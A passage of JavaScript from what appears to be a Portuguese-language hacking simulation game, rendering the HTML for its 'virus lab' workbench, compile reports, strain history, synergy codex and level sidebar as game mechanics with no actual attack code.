            onclick="window.virusLabEngine.toggleSelectBlock('${esc(b.id)}')">
            <div>
              <div class="vlab-block-head">
                <span class="vlab-block-lang">${esc(b.lang)}</span>
                <span class="vlab-tier-chip t-${b.tier}">Camada ${['I', 'II', 'III', 'IV', 'V'][b.tier - 1] || 'I'}</span>
              </div>
              <div class="vlab-block-fn">${esc(b.fn)}</div>
              <div class="vlab-block-hint">💡 ${esc(b.hint)}</div>
              <pre class="vlab-code-pre"><code>${esc(b.code)}</code></pre>
            </div>
            <div class="vlab-block-foot">
              <span class="vlab-abi-sig">${esc(b.abi)}</span>
              <span class="vlab-select-indicator">${isSelected ? `✓ SELECIONADO${selOrder}` : `[Opção ${idx + 1}]`}</span>
            </div>
          </button>
        `;
      }).join('');

      const canProceed = roundMeta.curCount === roundMeta.req;
      const liveNotionHtml = this.buildLiveComboNotion(draft);

      let actionRightHtml = '';
      if (r < 3) {
        actionRightHtml = `
          <button type="button" id="btnVlabNextRound" class="hc-btn primary" ${canProceed ? '' : 'disabled'}
            onclick="window.virusLabEngine.advanceRound()">
            Confirmar ${r === 1 ? '1 Bloco' : '2 Blocos'} (${roundMeta.curCount}/${roundMeta.req}) → Ir p/ Round ${r + 1}
          </button>
        `;
      } else {
        actionRightHtml = `
          <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
            <input type="text" id="vlabStrainNameInput" class="form-input"
              style="width:185px;font-family:var(--hc-font-mono);font-size:0.8rem;"
              maxlength="26" value="${esc(draft.customName || 'Hydra-X1')}"
              aria-label="Nome da cepa do vírus" placeholder="Nome da cepa">
            <button type="button" id="btnVlabCompile" class="hc-btn primary" ${canProceed ? '' : 'disabled'}
              onclick="window.virusLabEngine.compileCurrentDraft()">
              ⚡ Juntar os 4 Blocos &amp; Compilar Vírus
            </button>
          </div>
        `;
      }

      return `
        <div class="vlab-stepper" aria-label="Etapas de desenvolvimento do vírus">
          <div class="vlab-step-pill ${r === 1 ? 'is-active' : 'is-done'}">
            <span class="vlab-step-kicker">Round 1</span>
            <span class="vlab-step-title">Vetor Inicial</span>
            <span class="vlab-step-rule">3 opções → Escolher 1</span>
          </div>
          <div class="vlab-step-pill ${r === 2 ? 'is-active' : (r > 2 ? 'is-done' : '')}">
            <span class="vlab-step-kicker">Round 2</span>
            <span class="vlab-step-title">Núcleo Duplo</span>
            <span class="vlab-step-rule">3 opções → Escolher 2</span>
          </div>
          <div class="vlab-step-pill ${r === 3 ? 'is-active' : ''}">
            <span class="vlab-step-kicker">Round 3</span>
            <span class="vlab-step-title">Fechamento</span>
            <span class="vlab-step-rule">3 opções → Escolher 1</span>
          </div>
          <div class="vlab-step-pill">
            <span class="vlab-step-kicker">Teto Atual</span>
            <span class="vlab-step-title">v${(lvl.maxVerInt / 10).toFixed(1)} (${lvl.maxMult.toFixed(2)}x)</span>
            <span class="vlab-step-rule">Máx global: v10.0 (3.00x)</span>
          </div>
        </div>

        <div class="vlab-round-banner">
          <div>
            <div class="hc-eyebrow">Desenvolvimento Experimental · Sorteio Aleatório de Blocos</div>
            <h3 class="vlab-round-title">${esc(roundMeta.title)}</h3>
            <p class="vlab-round-sub">${esc(roundMeta.sub)}</p>
          </div>
          <div class="vlab-pick-counter" id="vlabPickCounter">
            Escolhidos: ${roundMeta.curCount} / ${roundMeta.req}
          </div>
        </div>

        <div class="vlab-cards-grid">
          ${cardsHtml}
        </div>

        <div class="vlab-combo-notion-box" id="vlabComboNotionBox">
          ${liveNotionHtml}
        </div>

        <div class="vlab-actions-bar">
          <div style="font-family:var(--hc-font-mono);font-size:0.75rem;color:var(--hc-text-2);">
            🔒 Sessão paga ($ ${LAB_SESSION_FEE.toLocaleString('pt-BR')}) ativa · Tentativa única deste Mês (Dia)
          </div>
          ${actionRightHtml}
        </div>
      `;
    }

    renderCompileReportHtml(rep) {
      const gradeCls = rep.fitGrade === 'S+' ? 'vlab-grade-Splus' : `vlab-grade-${rep.fitGrade}`;
      const diagItems = rep.diagnostics.map((d) => `<li class="${esc(d.kind)}">${esc(d.text)}</li>`).join('');
      const dd = rep.diskDelivery || {};
      const finalVerLabel = dd.activeVersion || rep.versionLabel;
      const finalMult = dd.activeMultiplier != null ? dd.activeMultiplier : rep.yieldMultiplier;

      let duplicateNoticeHtml = '';
      if (dd.outcomeMode === 'upgraded_existing') {
        duplicateNoticeHtml = `
          <div id="vlabDuplicateNotice" style="padding:11px 14px;border-radius:9px;background:rgba(56,189,248,0.1);border:1px solid rgba(56,189,248,0.42);margin-bottom:12px;font-size:0.81rem;color:#e0f2fe;">
            ⬆️ <strong>Evolução de Vírus Existente:</strong> você já tinha <code>${esc(rep.familyMeta.filename)} ${esc(dd.prevVersion)} (${Number(dd.prevMultiplier).toFixed(2)}x)</code> — como esta nova compilação saiu mais forte, seu vírus principal subiu para <strong>${esc(finalVerLabel)} (${finalMult.toFixed(2)}x)</strong>!
          </div>`;
      } else if (dd.outcomeMode === 'duplicate_refined') {
        duplicateNoticeHtml = `
          <div id="vlabDuplicateNotice" style="padding:11px 14px;border-radius:9px;background:rgba(167,139,250,0.11);border:1px solid rgba(167,139,250,0.45);margin-bottom:12px;font-size:0.81rem;color:#ede9fe;">
            ♻️ <strong>Mesmo Vírus Detectado (Fusão de Código):</strong> esta combinação gerou <code>${esc(rep.familyMeta.filename)} (${esc(rep.versionLabel)})</code>, mas você já tinha o <code>${esc(dd.prevVersion)}</code>! Mantivemos o seu mais forte, absorvemos os trechos novos para lapidar sua cepa para <strong>${esc(finalVerLabel)} (${finalMult.toFixed(2)}x)</strong> sem gastar espaço extra no HD e demos <strong>+${rep.duplicateRecycleXp} XP Bônus</strong>!
          </div>`;
      } else if (dd.outcomeMode === 'duplicate_maxed') {
        duplicateNoticeHtml = `
          <div id="vlabDuplicateNotice" style="padding:11px 14px;border-radius:9px;background:rgba(250,204,21,0.09);border:1px solid rgba(250,204,21,0.4);margin-bottom:12px;font-size:0.81rem;color:#fef9c3;">
            ♻️ <strong>Mesmo Vírus já no Teto Atual:</strong> você já possui <code>${esc(rep.familyMeta.filename)} ${esc(dd.activeVersion)} (${finalMult.toFixed(2)}x)</code> no limite do seu nível! Preservamos sua versão forte sem duplicar arquivos no HD e convertemos a repetição em <strong>+${rep.duplicateRecycleXp} XP Bônus de Engenharia</strong>!
          </div>`;
      }

      const setBanner = rep.matchedSet
        ? `<div style="padding:11px 14px;border-radius:9px;background:rgba(53,184,119,0.1);border:1px solid rgba(53,184,119,0.45);margin-bottom:12px;">
             <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;">
               <strong style="color:#4ade80;font-size:0.88rem;">
                 ${rep.isNewSetDiscovery ? '✨ NOVO CONJUNTO DESCOBERTO!' : '🧬 Conjunto Sintetizado:'} #${String(rep.matchedSet.num).padStart(2, '0')} — ${esc(rep.matchedSet.name)}
               </strong>
               <span class="hc-badge success">Camada ${['I', 'II', 'III', 'IV', 'V'][rep.matchedSet.minTier - 1]}</span>
             </div>
             <div style="font-size:0.78rem;color:var(--hc-text-2);margin-top:4px;">${esc(rep.matchedSet.desc)}</div>
           </div>`
        : `<div style="padding:10px 13px;border-radius:9px;background:rgba(248,113,113,0.09);border:1px solid rgba(248,113,113,0.35);margin-bottom:12px;font-size:0.8rem;color:#fecaca;">
             ⚠️ Os 4 blocos tiveram atrito estrutural (Encaixe ${rep.fitScore}%), gerando uma versão inicial reduzida sem ativar conjunto secreto — mas você ganhou <strong>+${rep.gainedXp} XP</strong> para liberar camadas mais fortes!
           </div>`;

      return `
        <div class="vlab-result-card" id="vlabCompileResultCard">
          <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:14px;flex-wrap:wrap;margin-bottom:14px;">
            <div style="display:flex;align-items:center;gap:14px;">
              <div class="vlab-grade-badge ${gradeCls}" title="Nota de Encaixe dos 4 Blocos">${esc(rep.fitGrade)}</div>
              <div>
                <div class="hc-eyebrow">Compilação Concluída · Sinergia de Código ${rep.fitScore}%</div>
                <div style="font-size:1.16rem;font-weight:800;color:var(--hc-text);">
                  ${esc(rep.strainName)}
                  <span style="font-family:var(--hc-font-mono);color:var(--hc-accent-text);">${esc(rep.versionLabel)}</span>
                  <span class="hc-badge info" style="margin-left:6px;font-family:var(--hc-font-mono);">
                    ${rep.yieldMultiplier.toFixed(2)}x ${esc(rep.familyMeta.unitLabel)}
                  </span>
                </div>
                <div style="font-size:0.79rem;color:var(--hc-text-2);margin-top:3px;">
                  Família: <strong>${esc(rep.familyMeta.label)}</strong> · Ativo no seu PC: <strong>${esc(finalVerLabel)} (${finalMult.toFixed(2)}x — máx. v10.0 = 3.00x)</strong>
                </div>
              </div>
            </div>
            <div style="text-align:right;font-family:var(--hc-font-mono);font-size:0.78rem;">
              <div style="color:#4ade80;font-weight:700;">+${rep.gainedXp} XP de Laboratório</div>
              <div style="color:#38bdf8;">+${rep.repGain} Reputação</div>
              ${rep.leveledUp ? `<div class="hc-badge success" style="margin-top:4px;">SUBIU P/ NÍVEL ${rep.newLevel}!</div>` : ''}
            </div>
          </div>

          ${duplicateNoticeHtml}
          ${setBanner}

          <div class="hc-eyebrow" style="margin-bottom:6px;">Diagnóstico do Linker (Por que ficou mais forte ou mais fraco)</div>
          <ul class="vlab-diag-list">
            ${diagItems}
          </ul>

          <details style="margin:12px 0;">
            <summary style="cursor:pointer;font-family:var(--hc-font-mono);font-size:0.77rem;color:var(--hc-text-2);">
              Ver código-fonte fundido dos 4 blocos (${rep.blocks.map((b) => b.id).join(' + ')})
            </summary>
            <pre class="vlab-code-pre" style="margin-top:8px;max-height:220px;"><code>${esc(rep.fusedCode)}</code></pre>
          </details>

          <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-top:14px;padding-top:12px;border-top:1px solid var(--hc-border);">
            <button type="button" class="hc-btn ghost" onclick="window.navTo('winSoftware')">
              📦 Ver em Programas &amp; Proteção (${esc(rep.familyMeta.filename)})
            </button>
            <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
              <span style="font-family:var(--hc-font-mono);font-size:0.76rem;color:#fbbf24;">
                ⏳ Próxima chance em <strong id="vlabLiveCooldownTimer">${esc(this.formatCooldownMs(this.getCooldownRemainingMs()))}</strong> (1x por Mês/Dia · $ ${LAB_SESSION_FEE.toLocaleString('pt-BR')})
              </span>
              <button type="button" id="btnVlabCloseReport" class="hc-btn sm" onclick="window.virusLabEngine.lastCompileReport=null;window.virusLabEngine.renderUI();">
                Ver Painel de Espera
              </button>
            </div>
          </div>
        </div>
      `;
    }

    renderCreationsHtml() {
      if (this.state.creations.length === 0) {
        return `
          <div class="hc-card" style="padding:24px;text-align:center;">
            <div style="font-size:0.95rem;font-weight:700;margin-bottom:6px;">Nenhum vírus desenvolvido ainda</div>
            <p style="font-size:0.82rem;color:var(--hc-text-2);margin-bottom:14px;">
              Vá até a <strong>Bancada de Código (3 Rounds)</strong> e junte 4 blocos de programação (1 + 2 + 1) para compilar sua primeira cepa autoral!
            </p>
            <button type="button" class="hc-btn primary" onclick="window.virusLabEngine.switchTab('workbench')">Ir para a Bancada</button>
          </div>
        `;
      }

      const rows = this.state.creations.map((c) => {
        const mult = c.yieldMultiplier != null ? Number(c.yieldMultiplier) : calcVirusMultiplier(c.versionInt);
        const dupTag = (c.outcomeMode === 'duplicate_refined' || c.outcomeMode === 'duplicate_maxed')
          ? `<span class="hc-badge" style="font-size:10px;margin-left:4px;">♻️ Fusão</span>`
          : '';
        return `
          <tr>
            <td style="font-family:var(--hc-font-mono);font-weight:700;color:var(--hc-text);">${esc(c.strainName)}${dupTag}</td>
            <td style="font-family:var(--hc-font-mono);color:var(--hc-text-2);">${esc(c.filename)}</td>
            <td style="font-family:var(--hc-font-mono);color:var(--hc-accent-text);font-weight:700;">${esc(c.versionLabel)} (${mult.toFixed(2)}x)</td>
            <td><span class="hc-badge ${c.fitScore >= 74 ? 'success' : (c.fitScore >= 50 ? 'warn' : 'danger')}">${esc(c.fitGrade)} (${c.fitScore}%)</span></td>
            <td style="font-size:0.78rem;color:var(--hc-text-2);">${esc(c.setName)}</td>
            <td style="font-family:var(--hc-font-mono);font-size:0.72rem;color:var(--hc-text-3);">${esc((c.blockIds || []).join(' · '))}</td>
          </tr>
        `;
      }).join('');

      return `
        <div class="hc-card" style="padding:14px;overflow-x:auto;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:8px;flex-wrap:wrap;">
            <div>
              <div class="hc-eyebrow">Arquivo de Cepas Compiladas</div>
              <div style="font-size:0.92rem;font-weight:700;">Histórico de Vírus &amp; Multiplicadores (Teto v10.0 = 3.00x)</div>
            </div>
            <button type="button" class="hc-btn sm primary" onclick="window.virusLabEngine.switchTab('workbench')">Ir p/ Bancada</button>
          </div>
          <table class="soft-table" style="width:100%;">
            <thead>
              <tr>
                <th>Cepa</th>
                <th>Binário</th>
                <th>Versão &amp; Mult.</th>
                <th>Encaixe</th>
                <th>Conjunto Ativado</th>
                <th>Assinatura (1+2+1)</th>
              </tr>
            </thead>
            <tbody>${rows}</tbody>
          </table>
        </div>
      `;
    }

    renderCodexHtml(lvl) {
      const cards = VIRUS_SYNERGY_SETS.map((s) => {
        const unlocked = this.state.discoveredSets.includes(s.id);
        const tierLocked = s.minTier > lvl.maxTier;
        const famMeta = VIRUS_FAMILY_META[s.family];
        const tierPeakVer = [18, 45, 67, 88, 100][s.minTier - 1] || 18;
        const tierPeakMult = calcVirusMultiplier(tierPeakVer);
        return `
          <div class="vlab-codex-card ${unlocked ? 'unlocked' : 'locked'}">
            <div style="display:flex;justify-content:space-between;align-items:center;gap:6px;">
              <span style="font-family:var(--hc-font-mono);font-size:0.72rem;color:${unlocked ? '#4ade80' : 'var(--hc-text-3)'};">
                #${String(s.num).padStart(2, '0')} · Camada ${['I', 'II', 'III', 'IV', 'V'][s.minTier - 1]}
              </span>
              <span class="hc-badge ${unlocked ? 'success' : ''}" style="font-size:0.68rem;">
                ${unlocked ? `Até ${tierPeakMult.toFixed(2)}x` : (tierLocked ? 'Bloqueado (Nv.+)' : 'Não Descoberto')}
              </span>
            </div>
            <div style="font-size:0.84rem;font-weight:700;color:var(--hc-text);">
              ${unlocked ? esc(s.name) : '??? Conjunto Criptografado'}
            </div>
            <div style="font-size:0.74rem;color:var(--hc-text-2);">
              ${unlocked
                ? `${esc(s.desc)} <br><span style="color:#38bdf8;font-family:var(--hc-font-mono);">${esc(famMeta.filename)}</span>`
                : `Desenvolva vírus na Camada ${['I', 'II', 'III', 'IV', 'V'][s.minTier - 1]}+ combinando blocos compatíveis para revelar.`}
            </div>
          </div>
        `;
      }).join('');

      return `
        <div>
          <div style="margin-bottom:12px;">
            <div class="hc-eyebrow">Catálogo de Engenharia · 54 Arquétipos</div>
            <div style="font-size:0.95rem;font-weight:700;">Códice de Conjuntos de Vírus (${this.state.discoveredSets.length} de ${VIRUS_SYNERGY_SETS.length} Descobertos)</div>
            <p style="font-size:0.79rem;color:var(--hc-text-2);margin:3px 0 0;">
              Evolua o laboratório até o Nível 10 para destravar todas as Camadas (I a V) e atingir o multiplicador máximo de <strong>3.00x na versão v10.0</strong>!
            </p>
          </div>
          <div class="vlab-codex-grid">
            ${cards}
          </div>
        </div>
      `;
    }

    renderSidebarHtml(lvl, stats, discCount) {
      const draft = this.state.activeDraft;
      const b1 = draft && draft.picks.r1 ? BLOCK_BY_ID.get(draft.picks.r1) : null;
      const b2a = draft && draft.picks.r2 && draft.picks.r2[0] ? BLOCK_BY_ID.get(draft.picks.r2[0]) : null;
      const b2b = draft && draft.picks.r2 && draft.picks.r2[1] ? BLOCK_BY_ID.get(draft.picks.r2[1]) : null;
      const b3 = draft && draft.picks.r3 ? BLOCK_BY_ID.get(draft.picks.r3) : null;

      return `
        <div class="vlab-side-box">
          <div style="display:flex;justify-content:space-between;align-items:center;">
            <span class="hc-eyebrow">Nível do Laboratório</span>
            <span class="hc-badge ${lvl.isMaxLevel ? 'success' : 'info'}" id="vlabLevelBadge">
              Nv. ${lvl.level} / ${MAX_LAB_LEVEL}${lvl.isMaxLevel ? ' (MÁX)' : ''}
            </span>
          </div>
          <div style="font-size:0.94rem;font-weight:700;margin-top:4px;">${esc(lvl.title)}</div>
          <div class="vlab-xp-track" aria-label="Progresso de XP do Laboratório">
            <div class="vlab-xp-fill" style="width:${lvl.progressPct}%;"></div>
          </div>
          <div style="display:flex;justify-content:space-between;font-family:var(--hc-font-mono);font-size:0.72rem;color:var(--hc-text-2);">
            <span>${lvl.xp} XP</span>
            <span>${lvl.isMaxLevel ? 'NÍVEL MÁXIMO' : `Próx: ${lvl.nextXpReq} XP`}</span>
          </div>
          <div style="margin-top:8px;padding-top:8px;border-top:1px solid var(--hc-border);font-size:0.75rem;color:var(--hc-text-2);">
            <div>Camada ativa: <strong style="color:#4ade80;">Camada I até ${['I', 'II', 'III', 'IV', 'V'][lvl.maxTier - 1]}</strong></div>
            <div>Teto atual: <strong style="font-family:var(--hc-font-mono);color:#38bdf8;">v${(lvl.maxVerInt / 10).toFixed(1)} (${lvl.maxMult.toFixed(2)}x)</strong></div>
            <div style="margin-top:4px;color:var(--hc-text-3);">${esc(lvl.nextUnlockNote)}</div>
          </div>
        </div>

        <div class="vlab-side-box">
          <div class="hc-eyebrow">Escala Regressiva (Base v10.0 = 3.00x)</div>
          <div style="font-size:0.72rem;color:var(--hc-text-2);margin-top:3px;">
            O vírus mais forte (<strong>v10.0</strong>) rende <strong>3.00x</strong> BTC / $ Spam / DDoS, regredindo nas versões menores:
          </div>
          <div class="vlab-scale-rows" id="vlabRegressionScaleBox">
            <div class="vlab-scale-row peak"><span>v10.0 (Máx)</span><strong>3.00x</strong></div>
            <div class="vlab-scale-row"><span>v7.0 (Camada IV)</span><strong>2.33x</strong></div>
            <div class="vlab-scale-row"><span>v5.5 (Camada III)</span><strong>2.00x</strong></div>
            <div class="vlab-scale-row"><span>v3.0 (Camada II)</span><strong>1.44x</strong></div>
            <div class="vlab-scale-row"><span>v1.0 (Básico)</span><strong>1.00x</strong></div>
            <div class="vlab-scale-row"><span>v0.6 (Fraco)</span><strong>0.68x</strong></div>
          </div>
        </div>

        <div class="vlab-side-box">
          <div class="hc-eyebrow">Slots da Montagem (1 + 2 + 1)</div>
          <div class="vlab-slot-list">
            <div class="vlab-slot-row ${b1 ? 'filled' : ''}">
              <span>R1 [1/1]</span>
              <span>${b1 ? esc(b1.id + ' · ' + b1.lang) : 'Aguardando...'}</span>
            </div>
            <div class="vlab-slot-row ${b2a ? 'filled' : ''}">
              <span>R2-A [1/2]</span>
              <span>${b2a ? esc(b2a.id + ' · ' + b2a.lang) : 'Aguardando...'}</span>
            </div>
            <div class="vlab-slot-row ${b2b ? 'filled' : ''}">
              <span>R2-B [2/2]</span>
              <span>${b2b ? esc(b2b.id + ' · ' + b2b.lang) : 'Aguardando...'}</span>
            </div>
            <div class="vlab-slot-row ${b3 ? 'filled' : ''}">
              <span>R3 [1/1]</span>
              <span>${b3 ? esc(b3.id + ' · ' + b3.lang) : 'Aguardando...'}</span>
            </div>
          </div>
        </div>

        <div class="vlab-side-box">
          <div class="hc-eyebrow">Matriz Combinatória</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px;font-family:var(--hc-font-mono);font-size:0.76rem;">
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">BLOCOS REAIS</div>
              <strong style="color:var(--hc-text);font-size:0.92rem;">${stats.totalBlocks}</strong>
            </div>
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">JUNÇÕES ÚNICAS</div>
              <strong style="color:#38bdf8;font-size:0.92rem;">${stats.totalCombinations.toLocaleString('pt-BR')}</strong>
            </div>
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">CONJUNTOS</div>
              <strong style="color:#4ade80;font-size:0.92rem;">${discCount} / ${stats.totalSynergySets}</strong>
            </div>
            <div style="padding:7px;border-radius:6px;background:#0a0e13;border:1px solid #1e2733;">
              <div style="color:var(--hc-text-3);font-size:0.66rem;">COMPILADOS</div>
              <strong style="color:var(--hc-text);font-size:0.92rem;">${this.state.totalCompiled}</strong>
            </div>
          </div>
        </div>
      `;
    }
  }

  window.VIRUS_LAB_CONSTANTS = {
    MAX_LAB_LEVEL,
    LAB_SESSION_FEE,
    LAB_COOLDOWN_MS,
    LAB_LEVEL_TABLE,
    ROUND_1_BLOCKS,
    ROUND_2_BLOCKS,
    ROUND_3_BLOCKS,
    VIRUS_SYNERGY_SETS,
    calcVirusMultiplier
  };
  window.virusLabEngine = new VirusLabEngine();
})();
